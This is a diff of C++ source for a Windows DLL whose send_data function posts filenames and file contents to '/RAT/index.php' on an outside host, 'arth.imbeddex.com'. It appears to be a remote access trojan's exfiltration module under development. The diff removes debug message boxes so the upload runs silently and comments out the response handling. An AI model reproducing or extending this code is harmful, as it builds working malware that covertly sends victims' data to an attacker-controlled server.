@@ -18,6 +18,7 @@ using namespace std;
 #define DLL_EXPORT 
 #endif
 
+SOCKET clientSocket;
 std::mutex socketMutex; 
 
 void safe_closesocket(SOCKET &clientSocket)
@@ -77,64 +78,67 @@ bool socket_setup(SOCKET &clientSocket)
     return true;
 }
 
-DLL_EXPORT void send_data(SOCKET &clientSocket, const string filename ,const string data)
+DLL_EXPORT void send_data(const string& filename , const string& data)
 {
     {
         lock_guard<mutex> lock1(socketMutex); 
         
         socket_setup(clientSocket);
-        MessageBoxA(NULL, "socket done", "socket setup", MB_OK | MB_ICONINFORMATION);
 
-        MessageBoxA(NULL, filename.c_str(), "sent req", MB_OK | MB_ICONINFORMATION);
-        MessageBoxA(NULL, data.c_str(), "sent req", MB_OK | MB_ICONINFORMATION);
-        string whole_data = string(filename)+string(data);MessageBoxA(NULL, whole_data.c_str(), "sent req", MB_OK | MB_ICONINFORMATION); 
-        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";MessageBoxA(NULL, httpRequest.c_str(), "sent req", MB_OK | MB_ICONINFORMATION); 
-        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
+        string strfilename="",strdata="",httpRequest = "";;
+        strfilename = filename.c_str();
+        strdata = data.c_str();
+        
+        string strFinal = strfilename + strdata;
+        httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n"; 
+        httpRequest += "Content-Length: " + to_string(strFinal.length()) + "\r\n";
         httpRequest += "Content-Type: application/octet-stream\r\n";
         httpRequest += "Connection: close\r\n\r\n";
-        httpRequest += whole_data;                                                                // Append the actual data
+        httpRequest += strFinal;
 
-        MessageBoxA(NULL, httpRequest.c_str(), "sent req", MB_OK | MB_ICONINFORMATION); 
         int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
         if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
             cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
         }
-    
+
         ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
+        // char buffer[4096]; // Increased buffer size
+        // string receivedData;
+        // int bytesReceived;
 
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+        // do {
+        //     bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
 
-            if (bytesReceived > 0)
-            {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            }
-            else if (bytesReceived == 0)
-            {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            }
-            else
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
+        //     if (bytesReceived > 0)
+        //     {
+        //         buffer[bytesReceived] = '\0';
+        //         receivedData += buffer; // Append to the received data
+        //     }
+        //     else if (bytesReceived == 0)
+        //     {
+        //         cerr << "Connection closed by server." << endl;
+        //         break; // Exit the loop on clean close
+        //     }
+        //     else
+        //     {
+        //         int error = WSAGetLastError();
+        //         if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+        //         break; // Exit loop on error
+        //     }
+        // } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
 
         ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
         safe_closesocket(clientSocket);
+        //MessageBoxA(NULL, "socket closed" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+
+        return;
     }
+
 }
 
 DLL_EXPORT string receive_data(SOCKET &clientSocket, const string &filename)
@@ -241,10 +245,14 @@ BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpRese
     {
         case DLL_PROCESS_ATTACH:
         {
-            MessageBoxA(NULL, "Hello, world!", "MessageBox Demo", MB_OK | MB_ICONINFORMATION); 
+            //MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION); 
             break;
         }
         case DLL_PROCESS_DETACH:
+        {
+            //MessageBoxA(NULL, "DLL_PROCESS_DETACH" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
+            break;
+        }
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
             break;
